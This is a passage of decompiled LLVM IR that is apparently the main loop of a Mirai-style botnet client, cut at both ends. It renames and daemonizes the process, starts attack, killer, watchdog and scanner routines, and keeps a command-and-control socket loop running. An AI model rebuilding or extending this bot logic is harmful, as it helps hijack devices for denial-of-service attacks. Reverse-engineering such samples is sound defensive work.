  %v3_dc94 = call i32 @util_strcpy(i8* %v2_dc94, i32 %v2_dc68)
  store i32 32, i32* @r1, align 4
  store i32 %v2_dc68, i32* @r0, align 4
  %v0_dca0 = call i32 @util_zero()
  %v0_dca4 = call i32 @rand_next()
  store i32 %v0_dca4, i32* @r7, align 4
  %v0_dcac = load i32, i32* @r8, align 4
  %v1_dcac = inttoptr i32 %v0_dcac to i32*
  %v2_dcac = load i32, i32* %v1_dcac, align 4
  %v1_dcb0 = inttoptr i32 %v2_dcac to i8*
  %v2_dcb0 = call i32 @util_strlen(i8* %v1_dcb0)
  store i32 %v2_dcb0, i32* @r6, align 4
  %v0_dcb8 = load i32, i32* @r8, align 4
  %v1_dcb8 = inttoptr i32 %v0_dcb8 to i32*
  %v2_dcb8 = load i32, i32* %v1_dcb8, align 4
  %v1_dcbc = inttoptr i32 %v2_dcb8 to i8*
  %v2_dcbc = call i32 @util_strlen(i8* %v1_dcbc)
  %v0_dcc0 = load i32, i32* @r6, align 4
  %v1_dcc0 = sub i32 20, %v0_dcc0
  %v0_dcc8 = load i32, i32* @r7, align 4
  %v3_dccc = urem i32 %v0_dcc8, %v1_dcc0
  %v2_dcd0 = add i32 %v3_dccc, %v2_dcbc
  store i32 %v2_dcd0, i32* @r4, align 4
  %v2_dcdc = call i32 @rand_alpha_str(i32 %v2_dc68, i32 %v2_dcd0)
  store i32 %v2_dc7c, i32* %r2.global-to-local, align 4
  %v1_dce4 = load i32, i32* @r4, align 4
  %v2_dce4 = add i32 %v1_dce4, %v2_dc7c
  store i32 %v2_dce4, i32* %r3.global-to-local, align 4
  %v0_dce8 = load i32, i32* @sl, align 4
  %v1_dce8 = trunc i32 %v0_dce8 to i8
  %v3_dce8 = add i32 %v2_dce4, -80
  %v4_dce8 = inttoptr i32 %v3_dce8 to i8*
  store i8 %v1_dce8, i8* %v4_dce8, align 1
  %v4_dcf4 = call i32 @prctl(i32 15, i32 %v2_dc68, i32 %v2_dc7c, i32 %v2_dce4)
  %v1_dcfc = call i32 @table_unlock_val(i32 5)
  %v3_dd0c = call i32 @table_retrieve_val(i32 5, i32* nonnull %stack_var_-48)
  %v3_dd10 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_dd10, i32* @r2, align 4
  %v2_dd1c = call i32 @__GI___libc_write(i32 1, i32 %v3_dd0c)
  store i32 1, i32* @r2, align 4
  %v2_dd2c = call i32 @__GI___libc_write(i32 1, i32 ptrtoint (i32* @global_var_19acc.105 to i32))
  %v1_dd34 = call i32 @table_lock_val(i32 5)
  %v1_dd38 = call i32 @attack_init(i32 %v1_dd34)
  %v1_dd3c = call i32 @killer_init(i32 %v1_dd38)
  %v1_dd40 = call i32 @watchdog_maintain(i32 %v1_dd3c)
  %v0_dd44 = call i32 @__libc_fork()
  %v1_dd48 = load i32, i32* @sl, align 4
  %v7_dd4c = icmp sgt i32 %v0_dd44, %v1_dd48
  br i1 %v7_dd4c, label %dec_label_pc_dd50, label %dec_label_pc_dd9c

dec_label_pc_dd50:                                ; preds = %dec_label_pc_dc3c
  ret i32 %v1_dd48

dec_label_pc_dd64:                                ; preds = %entry
  %v0_dd64 = load i32, i32* @r8, align 4
  %v1_dd64 = add i32 %v0_dd64, 4
  %v2_dd64 = inttoptr i32 %v1_dd64 to i32*
  %v3_dd64 = load i32, i32* %v2_dd64, align 4
  %v1_dd68 = inttoptr i32 %v3_dd64 to i8*
  %v2_dd68 = call i32 @util_strlen(i8* %v1_dd68)
  %v8_dd70 = icmp sgt i32 %v2_dd68, 31
  br i1 %v8_dd70, label %dec_label_pc_dc3c, label %dec_label_pc_dd74

dec_label_pc_dd74:                                ; preds = %dec_label_pc_dd64
  %v0_dd74 = load i32, i32* @r8, align 4
  %v1_dd74 = add i32 %v0_dd74, 4
  %v2_dd74 = inttoptr i32 %v1_dd74 to i32*
  %v3_dd74 = load i32, i32* %v2_dd74, align 4
  store i32 %v2_dc18, i32* @r0, align 4
  %v2_dd7c = bitcast i32* %stack_var_-152 to i8*
  %v3_dd7c = call i32 @util_strcpy(i8* %v2_dd7c, i32 %v3_dd74)
  %v0_dd80 = load i32, i32* @r8, align 4
  %v1_dd80 = add i32 %v0_dd80, 4
  %v2_dd80 = inttoptr i32 %v1_dd80 to i32*
  %v3_dd80 = load i32, i32* %v2_dd80, align 4
  %v1_dd88 = inttoptr i32 %v3_dd80 to i8*
  %v2_dd88 = call i32 @util_strlen(i8* %v1_dd88)
  store i32 %v2_dd88, i32* @r1, align 4
  store i32 %v3_dd80, i32* @r0, align 4
  %v0_dd94 = call i32 @util_zero()
  br label %dec_label_pc_dc3c

dec_label_pc_dd9c:                                ; preds = %dec_label_pc_dc3c
  %v1_dd9c = call i32 @__GI_setsid(i32 %v0_dd44)
  %v0_dda4 = load i32, i32* @sl, align 4
  %v1_dda8 = call i32 @__GI___libc_close(i32 %v0_dda4)
  %v1_ddb0 = call i32 @__GI___libc_close(i32 1)
  %v1_ddb8 = call i32 @__GI___libc_close(i32 2)
  store i32 ptrtoint (i32* @global_var_222e8.107 to i32), i32* @fp, align 4
  %v1_ddc0 = call i32 @attack_init(i32 %v1_ddb8)
  %v1_ddc4 = call i32 @killer_init(i32 %v1_ddc0)
  %v1_ddc8 = call i32 @watchdog_maintain(i32 %v1_ddc4)
  %v1_ddcc = call i32 @scanner_init(i32 %v1_ddc8)
  %v0_ddd0 = load i32, i32* @sl, align 4
  %v2_ddd4 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_ddd4, i32* @r7, align 4
  %v2_ddd8 = ptrtoint i32* %stack_var_-408 to i32
  store i32 %v2_ddd8, i32* @r6, align 4
  %v2_deb8 = ptrtoint i32* %stack_var_-72 to i32
  %v2_df08 = ptrtoint i32* %stack_var_-168 to i32
  %v2_e0e4 = ptrtoint i32* %stack_var_-56 to i32
  %v2_e0ec = ptrtoint i8** %stack_var_-42 to i32
  %v2_e294 = ptrtoint i32* %stack_var_-1432 to i32
  %v2_e108 = ptrtoint i32* %stack_var_-52 to i32
  %v1_e1bc = bitcast i32* %stack_var_-152 to i8*
  %v2_e17c = ptrtoint i32* %stack_var_-88 to i32
  %v1_e198 = sub i32 0, %v1_dd9c
  br label %dec_label_pc_dddc

dec_label_pc_dddc:                                ; preds = %dec_label_pc_e21c, %dec_label_pc_e2b8, %bb44, %dec_label_pc_e1b8, %dec_label_pc_dfec, %dec_label_pc_dfdc, %bb41, %dec_label_pc_e30c, %dec_label_pc_e278, %dec_label_pc_e22c, %dec_label_pc_e208, %dec_label_pc_e134, %dec_label_pc_e05c, %dec_label_pc_df94, %dec_label_pc_dd9c
  %stack_var_-1436.0 = phi i32 [ %v0_ddd0, %dec_label_pc_dd9c ], [ %stack_var_-1436.0, %bb41 ], [ %stack_var_-1436.1, %dec_label_pc_dfdc ], [ %stack_var_-1436.1, %dec_label_pc_dfec ], [ %stack_var_-1436.1, %bb44 ], [ %stack_var_-1436.1, %dec_label_pc_e22c ], [ %stack_var_-1436.1, %dec_label_pc_e05c ], [ %stack_var_-1436.1, %dec_label_pc_e2b8 ], [ %stack_var_-1436.1, %dec_label_pc_e30c ], [ %stack_var_-1436.1, %dec_label_pc_e278 ], [ %stack_var_-1436.1, %dec_label_pc_df94 ], [ %stack_var_-1436.1, %dec_label_pc_e1b8 ], [ %stack_var_-1436.1, %dec_label_pc_e208 ], [ %stack_var_-1436.1, %dec_label_pc_e134 ], [ %stack_var_-1436.1, %dec_label_pc_e21c ]
  store i32 0, i32* %stack_var_-280, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_dde8

dec_label_pc_dde8:                                ; preds = %dec_label_pc_dde8, %dec_label_pc_dddc
  %v1_ddec = phi i32 [ %v1_ddf0, %dec_label_pc_dde8 ], [ 4, %dec_label_pc_dddc ]
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_ddec = load i32, i32* @r7, align 4
  %v3_ddec = add i32 %v2_ddec, %v1_ddec
  %v4_ddec = inttoptr i32 %v3_ddec to i32*
  store i32 0, i32* %v4_ddec, align 4
  %v0_ddf0 = load i32, i32* %r3.global-to-local, align 4
  %v1_ddf0 = add i32 %v0_ddf0, 4
  store i32 %v1_ddf0, i32* %r3.global-to-local, align 4
  %v7_ddf4 = icmp eq i32 %v1_ddf0, 128
  br i1 %v7_ddf4, label %dec_label_pc_ddfc, label %dec_label_pc_dde8

dec_label_pc_ddfc:                                ; preds = %dec_label_pc_dde8
  %v0_ddfc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_ddfc, i32* %stack_var_-408, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_de04

dec_label_pc_de04:                                ; preds = %dec_label_pc_de04, %dec_label_pc_ddfc
  %v1_de08 = phi i32 [ %v1_de0c, %dec_label_pc_de04 ], [ 4, %dec_label_pc_ddfc ]
  store i32 0, i32* @r4, align 4
  %v2_de08 = load i32, i32* @r6, align 4
  %v3_de08 = add i32 %v2_de08, %v1_de08
  %v4_de08 = inttoptr i32 %v3_de08 to i32*
  store i32 0, i32* %v4_de08, align 4
  %v0_de0c = load i32, i32* %r3.global-to-local, align 4
  %v1_de0c = add i32 %v0_de0c, 4
  store i32 %v1_de0c, i32* %r3.global-to-local, align 4
  %v7_de10 = icmp eq i32 %v1_de0c, 128
  br i1 %v7_de10, label %dec_label_pc_de18, label %dec_label_pc_de04

dec_label_pc_de18:                                ; preds = %dec_label_pc_de04
  store i32 ptrtoint (i32* @global_var_222e4.88 to i32), i32* %r3.global-to-local, align 4
  %v2_de1c = load i32, i32* @global_var_222e4.88, align 4
  %v7_de20 = icmp eq i32 %v2_de1c, -1
  br i1 %v7_de20, label %dec_label_pc_de4c, label %dec_label_pc_de28

dec_label_pc_de28:                                ; preds = %dec_label_pc_de18
  %v3_de28 = udiv i32 %v2_de1c, 32
  %v3_de2c = mul nuw nsw i32 %v3_de28, 4
  store i32 %v2_dc7c, i32* %ip.global-to-local, align 4
  %v2_de34 = add i32 %v3_de2c, %v2_dc7c
  store i32 %v2_de34, i32* %r3.global-to-local, align 4
  %v1_de38 = add i32 %v2_de34, -240
  %v2_de38 = inttoptr i32 %v1_de38 to i32*
  %v3_de38 = load i32, i32* %v2_de38, align 4
  %v1_de3c = urem i32 %v2_de1c, 32
  %v7_de44 = shl i32 1, %v1_de3c
  %v8_de44 = or i32 %v3_de38, %v7_de44
  store i32 %v8_de44, i32* %r2.global-to-local, align 4
  store i32 %v8_de44, i32* %v2_de38, align 4
  br label %dec_label_pc_de4c

dec_label_pc_de4c:                                ; preds = %dec_label_pc_de18, %dec_label_pc_de28
  %v2_de4c = load i32, i32* @global_var_222e8.107, align 4
  store i32 %v2_de4c, i32* @r3, align 4
  %v7_de50 = icmp eq i32 %v2_de4c, -1
  store i32 ptrtoint (i32* @global_var_222e8.107 to i32), i32* @r8, align 4
  br i1 %v7_de50, label %dec_label_pc_e074, label %dec_label_pc_de5c

dec_label_pc_de5c:                                ; preds = %dec_label_pc_e074, %dec_label_pc_de4c, %bb43
  %v2_de60 = load i8, i8* bitcast (i8** @global_var_22468.110 to i8*), align 4
  %v2_de64 = icmp eq i8 %v2_de60, 0
  %v2_dfb0 = load i32, i32* @global_var_222e8.107, align 4
  store i32 %v2_dfb0, i32* %ip.global-to-local, align 4
  %v3_dfb4 = udiv i32 %v2_dfb0, 32
  store i32 %v3_dfb4, i32* %r3.global-to-local, align 4
  br i1 %v2_de64, label %dec_label_pc_dfb0, label %dec_label_pc_de6c

dec_label_pc_de6c:                                ; preds = %dec_label_pc_de5c
  %v3_de78 = mul nuw nsw i32 %v3_dfb4, 4
  %v2_de7c = add i32 %v3_de78, %v2_dc7c
  store i32 %v2_de7c, i32* %r3.global-to-local, align 4
  %v1_de80 = add i32 %v2_de7c, -368
  %v2_de80 = inttoptr i32 %v1_de80 to i32*
  %v3_de80 = load i32, i32* %v2_de80, align 4
  %v1_de84 = urem i32 %v2_dfb0, 32
  %v7_de8c = shl i32 1, %v1_de84
  %v8_de8c = or i32 %v3_de80, %v7_de8c
  store i32 %v8_de8c, i32* %r2.global-to-local, align 4
  store i32 %v8_de8c, i32* %v2_de80, align 4
  br label %dec_label_pc_de94

dec_label_pc_de94:                                ; preds = %dec_label_pc_dfb0, %dec_label_pc_de6c
  store i32 ptrtoint (i32* @global_var_222e4.88 to i32), i32* %r3.global-to-local, align 4
  %v2_de98 = load i32, i32* @global_var_222e4.88, align 4
  store i32 0, i32* @lr, align 4
  %v0_dea0 = load i32, i32* %ip.global-to-local, align 4
  %v5_dea4 = icmp slt i32 %v0_dea0, %v2_de98
  br i1 %v5_dea4, label %bb41, label %bb

bb:                                               ; preds = %dec_label_pc_de94
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_de94, %bb
  %v0_deb4 = phi i32 [ %v2_de98, %dec_label_pc_de94 ], [ %v0_dea0, %bb ]
  store i32 10, i32* %stack_var_-72, align 4
  %v1_deb4 = add i32 %v0_deb4, 1
  store i32 %v2_deb8, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_ddd8, i32* %r2.global-to-local, align 4
  %v5_ded0 = call i32 @__libc_select(i32 %v1_deb4, i32 %v2_ddd4, i32 %v2_ddd8, i32 0, i32 %v2_deb8)
  %v8_ded4 = icmp eq i32 %v5_ded0, -1
  br i1 %v8_ded4, label %dec_label_pc_dddc, label %dec_label_pc_dedc

dec_label_pc_dedc:                                ; preds = %bb41
  %v6_ded0 = trunc i32 %v5_ded0 to i16
  %v3_dedc = icmp eq i16 %v6_ded0, 0
  br i1 %v3_dedc, label %dec_label_pc_dee4, label %dec_label_pc_df18

dec_label_pc_dee4:                                ; preds = %dec_label_pc_dedc
  %v5_def0 = srem i32 %stack_var_-1436.0, 6
  %v4_def8 = sub i32 %stack_var_-1436.0, %v5_def0
  store i32 %v4_def8, i32* %r3.global-to-local, align 4
  %v2_df00 = icmp eq i32 %v5_def0, 0
  %v1_df04 = add i32 %stack_var_-1436.0, 1
  store i32 %v1_df04, i32* @lr, align 4
  store i32 %v2_df08, i32* %r2.global-to-local, align 4
  %v7_df0c = inttoptr i32 %v5_ded0 to i8*
  store i8* %v7_df0c, i8** %stack_var_-42, align 4
  br i1 %v2_df00, label %dec_label_pc_e0e4, label %dec_label_pc_df18

dec_label_pc_df18:                                ; preds = %dec_label_pc_dedc, %dec_label_pc_dee4, %dec_label_pc_e0e4
  %stack_var_-1436.1 = phi i32 [ %v1_df04, %dec_label_pc_e0e4 ], [ %v1_df04, %dec_label_pc_dee4 ], [ %stack_var_-1436.0, %dec_label_pc_dedc ]
  store i32 ptrtoint (i32* @global_var_222e4.88 to i32), i32* %r3.global-to-local, align 4
  %v2_df1c = load i32, i32* @global_var_222e4.88, align 4
  %v7_df20 = icmp eq i32 %v2_df1c, -1
  br i1 %v7_df20, label %dec_label_pc_df4c, label %dec_label_pc_df28

dec_label_pc_df28:                                ; preds = %dec_label_pc_df18
  %v3_df28 = udiv i32 %v2_df1c, 32
  %v3_df2c = mul nuw nsw i32 %v3_df28, 4
  store i32 %v2_dc7c, i32* %ip.global-to-local, align 4
  %v2_df34 = add i32 %v3_df2c, %v2_dc7c
  store i32 %v2_df34, i32* %r3.global-to-local, align 4
  %v1_df38 = add i32 %v2_df34, -240
  %v2_df38 = inttoptr i32 %v1_df38 to i32*
  %v3_df38 = load i32, i32* %v2_df38, align 4
  %v1_df3c = urem i32 %v2_df1c, 32
  %v6_df40 = ashr i32 %v3_df38, %v1_df3c
  store i32 %v6_df40, i32* %r2.global-to-local, align 4
  %v1_df44 = urem i32 %v6_df40, 2
  %v2_df44 = icmp eq i32 %v1_df44, 0
  br i1 %v2_df44, label %dec_label_pc_df4c, label %dec_label_pc_e170

dec_label_pc_df4c:                                ; preds = %dec_label_pc_df28, %dec_label_pc_df18
  %v2_df50 = load i8, i8* bitcast (i8** @global_var_22468.110 to i8*), align 4
  %v3_df50 = zext i8 %v2_df50 to i32
  store i32 %v3_df50, i32* @r4, align 4
  %v2_df54 = icmp eq i8 %v2_df50, 0
  %v2_dfdc = load i32, i32* @global_var_222e8.107, align 4
  br i1 %v2_df54, label %dec_label_pc_dfdc, label %dec_label_pc_df5c

dec_label_pc_df5c:                                ; preds = %dec_label_pc_df4c
  %v3_df60 = udiv i32 %v2_dfdc, 32
  store i32 %v2_dc7c, i32* %r2.global-to-local, align 4
  %v3_df68 = mul nuw nsw i32 %v3_df60, 4
  %v2_df6c = add i32 %v3_df68, %v2_dc7c
  store i32 %v2_df6c, i32* %r3.global-to-local, align 4
  %v1_df70 = add i32 %v2_df6c, -368
  %v2_df70 = inttoptr i32 %v1_df70 to i32*
  %v3_df70 = load i32, i32* %v2_df70, align 4
  %v1_df74 = urem i32 %v2_dfdc, 32
  %v6_df78 = ashr i32 %v3_df70, %v1_df74
  store i32 %v6_df78, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_22468.110 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_df84 = urem i32 %v6_df78, 2
  %v2_df84 = icmp eq i32 %v1_df84, 0
  store i8 0, i8* bitcast (i8** @global_var_22468.110 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_222e8.107 to i32), i32* @r5, align 4
  br i1 %v2_df84, label %dec_label_pc_df94, label %dec_label_pc_e100

dec_label_pc_df94:                                ; preds = %dec_label_pc_df5c
  store i32 57244, i32* @lr, align 4
  %v1_df98 = icmp ne i32 %v2_dfdc, -1
  call void @__pseudo_cond_branch(i1 %v1_df98, i32 ptrtoint (i32* @global_var_14ab0.112 to i32))
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_dfa0 = load i32, i32* @r5, align 4
  %v2_dfa0 = inttoptr i32 %v1_dfa0 to i32*
  store i32 -1, i32* %v2_dfa0, align 4
  %v1_dfa8 = call i32 @sleep(i32 1)
  br label %dec_label_pc_dddc

dec_label_pc_dfb0:                                ; preds = %dec_label_pc_de5c
  store i32 %v2_dc7c, i32* %r2.global-to-local, align 4
  %v3_dfbc = mul nuw nsw i32 %v3_dfb4, 4
  %v2_dfc0 = add i32 %v3_dfbc, %v2_dc7c
  store i32 %v2_dfc0, i32* %r3.global-to-local, align 4
  %v1_dfc4 = add i32 %v2_dfc0, -240
  %v2_dfc4 = inttoptr i32 %v1_dfc4 to i32*
  %v3_dfc4 = load i32, i32* %v2_dfc4, align 4
  %v1_dfc8 = urem i32 %v2_dfb0, 32
  %v7_dfd0 = shl i32 1, %v1_dfc8
  %v8_dfd0 = or i32 %v3_dfc4, %v7_dfd0
  store i32 %v8_dfd0, i32* %r2.global-to-local, align 4
  store i32 %v8_dfd0, i32* %v2_dfc4, align 4
  br label %dec_label_pc_de94

dec_label_pc_dfdc:                                ; preds = %dec_label_pc_df4c
  %v7_dfe0 = icmp eq i32 %v2_dfdc, -1
  store i32 ptrtoint (i32* @global_var_222e8.107 to i32), i32* @r8, align 4
  br i1 %v7_dfe0, label %dec_label_pc_dddc, label %dec_label_pc_dfec

dec_label_pc_dfec:                                ; preds = %dec_label_pc_dfdc
  %v3_dfec = udiv i32 %v2_dfdc, 32
  store i32 %v2_dc7c, i32* %r2.global-to-local, align 4
  %v3_dff4 = mul nuw nsw i32 %v3_dfec, 4
  %v2_dff8 = add i32 %v3_dff4, %v2_dc7c
  store i32 %v2_dff8, i32* %r3.global-to-local, align 4
  %v1_dffc = add i32 %v2_dff8, -240
  %v2_dffc = inttoptr i32 %v1_dffc to i32*
  %v3_dffc = load i32, i32* %v2_dffc, align 4
  %v1_e000 = urem i32 %v2_dfdc, 32
  %v6_e004 = ashr i32 %v3_dffc, %v1_e000
  store i32 %v6_e004, i32* %r2.global-to-local, align 4
  %v1_e008 = urem i32 %v6_e004, 2
  %v2_e008 = icmp eq i32 %v1_e008, 0
  br i1 %v2_e008, label %dec_label_pc_dddc, label %dec_label_pc_e010

dec_label_pc_e010:                                ; preds = %dec_label_pc_dfec
  %v6_e014 = inttoptr i32 %v3_df50 to i8*
  store i8* %v6_e014, i8** %stack_var_-42, align 4
  store i32 %v2_e0ec, i32* @sl, align 4
  %v0_e018 = call i32 @__GI___errno_location()
  %v0_e01c = load i32, i32* @r4, align 4
  %v2_e01c = inttoptr i32 %v0_e018 to i32*
  store i32 %v0_e01c, i32* %v2_e01c, align 4
  store i32 %v0_e018, i32* @r5, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_e02c = load i32, i32* @global_var_222e8.107, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_e038 = call i32 @__libc_recv(i32 %v2_e02c, i32 %v2_e0ec, i32 2, i32 16386)
  %v7_e03c = icmp eq i32 %v4_e038, -1
  br i1 %v7_e03c, label %dec_label_pc_e21c, label %dec_label_pc_e044

dec_label_pc_e044:                                ; preds = %dec_label_pc_e010
  %v2_e044 = icmp eq i32 %v4_e038, 0
  br i1 %v2_e044, label %dec_label_pc_e22c, label %dec_label_pc_e04c

dec_label_pc_e04c:                                ; preds = %dec_label_pc_e044
  store i32 %v2_df08, i32* %ip.global-to-local, align 4
  %v3_e050 = load i8*, i8** %stack_var_-42, align 4
  %v4_e050 = ptrtoint i8* %v3_e050 to i32
  store i32 %v4_e050, i32* %r3.global-to-local, align 4
  %v2_e054 = icmp eq i8* %v3_e050, null
  br i1 %v2_e054, label %dec_label_pc_e05c, label %dec_label_pc_e25c

dec_label_pc_e05c:                                ; preds = %dec_label_pc_e04c
  %v2_e05c = load i32, i32* @global_var_222e8.107, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_e068 = add i32 %v4_e050, 16384
  store i32 %v1_e068, i32* %r3.global-to-local, align 4
  %v4_e06c = call i32 @__libc_recv(i32 %v2_e05c, i32 %v2_e0ec, i32 2, i32 %v1_e068)
  br label %dec_label_pc_dddc

dec_label_pc_e074:                                ; preds = %dec_label_pc_de4c
  %v0_e07c = load i32, i32* @r4, align 4
  store i32 %v0_e07c, i32* %r2.global-to-local, align 4
  %v3_e080 = call i32 @socket(i32 2, i32 1, i32 %v0_e07c)
  %v7_e084 = icmp eq i32 %v3_e080, -1
  store i32 %v3_e080, i32* @r5, align 4
  %v1_e08c = load i32, i32* @r8, align 4
  %v2_e08c = inttoptr i32 %v1_e08c to i32*
  store i32 %v3_e080, i32* %v2_e08c, align 4
  br i1 %v7_e084, label %dec_label_pc_de5c, label %dec_label_pc_e094

dec_label_pc_e094:                                ; preds = %dec_label_pc_e074
  %v0_e094 = load i32, i32* @r4, align 4
  store i32 %v0_e094, i32* @r2, align 4
  %v2_e09c = call i32 @__libc_fcntl(i32 %v3_e080, i32 3)
  %v1_e0a4 = or i32 %v2_e09c, 2048
  store i32 %v1_e0a4, i32* @r2, align 4
  %v0_e0a8 = load i32, i32* @r5, align 4
  %v2_e0ac = call i32 @__libc_fcntl(i32 %v0_e0a8, i32 4)
  %v2_e0b4 = load i32, i32* @global_var_222ec.86, align 4
  store i32 %v2_e0b4, i32* %r3.global-to-local, align 4
  %v2_e0b8 = icmp eq i32 %v2_e0b4, 0
  br i1 %v2_e0b8, label %bb43, label %bb42

bb42:                                             ; preds = %dec_label_pc_e094
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_e094, %bb42
  %v2_e0c0 = xor i1 %v2_e0b8, true
  call void @__pseudo_cond_branch(i1 %v2_e0c0, i32 ptrtoint (i32* @global_var_10e78.113 to i32))
  store i32 ptrtoint (i8** @global_var_22468.110 to i32), i32* %ip.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_e0cc = load i32, i32* @global_var_222e8.107, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i8 1, i8* bitcast (i8** @global_var_22468.110 to i8*), align 4
  %v4_e0dc = call i32 @__libc_connect(i32 %v2_e0cc, i32 ptrtoint (i16** @global_var_24f84.93 to i32), i32 16)
  br label %dec_label_pc_de5c

dec_label_pc_e0e4:                                ; preds = %dec_label_pc_dee4
  %v2_e0e8 = load i32, i32* @global_var_222e8.107, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_e0f8 = call i32 @__libc_send(i32 %v2_e0e8, i32 %v2_e0ec, i32 2, i32 16384)
  br label %dec_label_pc_df18

dec_label_pc_e100:                                ; preds = %dec_label_pc_df5c
  store i32 4, i32* @r4, align 4
  store i32 %v2_e108, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v2_e0e4, i32* %ip.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-56, align 4
  %v5_e124 = call i32 @getsockopt(i32 %v2_dfdc, i32 1, i32 4, i32 %v2_e108, i32 %v2_e0e4)
  %v3_e128 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_e128, i32* %r3.global-to-local, align 4
  %v2_e12c = icmp eq i32 %v3_e128, 0
  br i1 %v2_e12c, label %dec_label_pc_e1b8, label %dec_label_pc_e134

dec_label_pc_e134:                                ; preds = %dec_label_pc_e100
  %v2_e134 = load i32, i32* @global_var_222e8.107, align 4
  %v1_e138 = call i32 @__GI___libc_close(i32 %v2_e134)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_e140 = load i32, i32* @r5, align 4
  %v2_e140 = inttoptr i32 %v1_e140 to i32*
  store i32 -1, i32* %v2_e140, align 4
  %v0_e144 = call i32 @rand_next()
  %v3_e14c = zext i32 %v0_e144 to i64
  %v4_e14c = mul nuw i64 %v3_e14c, 3435973837
  %v7_e14c = trunc i64 %v4_e14c to i32
  store i32 %v7_e14c, i32* %ip.global-to-local, align 4
  %v3_e1502 = udiv i64 %v4_e14c, 34359738368
  %v3_e1544 = mul nuw nsw i64 %v3_e1502, 8
  %v3_e154 = trunc i64 %v3_e1544 to i32
  store i32 %v3_e154, i32* %r2.global-to-local, align 4
  %v2_e1586 = mul nuw nsw i64 %v3_e1502, 2
  %v2_e158 = trunc i64 %v2_e1586 to i32
  %v2_e15c = add i32 %v3_e154, %v2_e158
  store i32 %v2_e15c, i32* %r3.global-to-local, align 4
  %v2_e160 = sub i32 %v0_e144, %v2_e15c
  %v1_e164 = add i32 %v2_e160, 1
  %v1_e168 = call i32 @sleep(i32 %v1_e164)
  br label %dec_label_pc_dddc

dec_label_pc_e170:                                ; preds = %dec_label_pc_df28
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 %v2_e108, i32* %r2.global-to-local, align 4
  store i32 16, i32* %stack_var_-52, align 4
  %v5_e184 = call i32 @__libc_accept(i32 %v2_df1c, i32 %v2_e17c, i32 %v2_e108, i32 16, i32 16)
  %v1_e188 = call i32 @scanner_kill(i32 %v5_e184)
  %v1_e18c = call i32 @killer_kill(i32 %v1_e188)
  %v2_e19c = call i32 @kill(i32 %v1_e198, i32 9)
  store i32 ptrtoint (i32* @global_var_22464.97 to i32), i32* %r3.global-to-local, align 4
  %v2_e1a4 = load i32, i32* @global_var_22464.97, align 4
  %v2_e1a8 = icmp eq i32 %v2_e1a4, 0
  br i1 %v2_e1a8, label %dec_label_pc_e1b0, label %dec_label_pc_e250

dec_label_pc_e1b0:                                ; preds = %dec_label_pc_e170, %dec_label_pc_e250
  %v1_e1b4 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_e1b8

dec_label_pc_e1b8:                                ; preds = %dec_label_pc_e100, %dec_label_pc_e1b0
  %v2_e1bc = call i32 @util_strlen(i8* %v1_e1bc)
  %sext = mul i32 %v2_e1bc, 16777216
  %v1_e1c0 = sdiv i32 %sext, 16777216
  %v7_e1c0 = inttoptr i32 %v1_e1c0 to i8*
  store i8* %v7_e1c0, i8** %stack_var_-42, align 4
  %v0_e1c4 = call i32 @util_local_addr()
  store i32 ptrtoint (i32* @global_var_24f78.59 to i32), i32* @lr, align 4
  %v0_e1cc = load i32, i32* @r4, align 4
  store i32 %v0_e1cc, i32* %r2.global-to-local, align 4
  store i32 %v0_e1c4, i32* @global_var_24f78.59, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_e1dc = load i32, i32* @r5, align 4
  %v1_e1dc = inttoptr i32 %v0_e1dc to i32*
  %v2_e1dc = load i32, i32* %v1_e1dc, align 4
  %v4_e1e0 = call i32 @__libc_send(i32 %v2_e1dc, i32 ptrtoint (i32* @global_var_19ad0.117 to i32), i32 %v0_e1cc, i32 16384)
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_e1ec = load i32, i32* @r5, align 4
  %v1_e1ec = inttoptr i32 %v0_e1ec to i32*
  %v2_e1ec = load i32, i32* %v1_e1ec, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_e1f8 = call i32 @__libc_send(i32 %v2_e1ec, i32 %v2_e0ec, i32 1, i32 16384)
  %v3_e1fc = load i8*, i8** %stack_var_-42, align 4
  %v4_e1fc = ptrtoint i8* %v3_e1fc to i32
  store i32 %v4_e1fc, i32* %r2.global-to-local, align 4
  %v3_e200 = icmp eq i8* %v3_e1fc, null
  br i1 %v3_e200, label %dec_label_pc_dddc, label %dec_label_pc_e208

dec_label_pc_e208:                                ; preds = %dec_label_pc_e1b8
  %v0_e208 = load i32, i32* @r5, align 4
  %v1_e208 = inttoptr i32 %v0_e208 to i32*
  %v2_e208 = load i32, i32* %v1_e208, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_e214 = call i32 @__libc_send(i32 %v2_e208, i32 %v2_dc18, i32 %v4_e1fc, i32 16384)
  br label %dec_label_pc_dddc

dec_label_pc_e21c:                                ; preds = %dec_label_pc_e28c, %dec_label_pc_e010
  %v0_e21c = load i32, i32* @r5, align 4
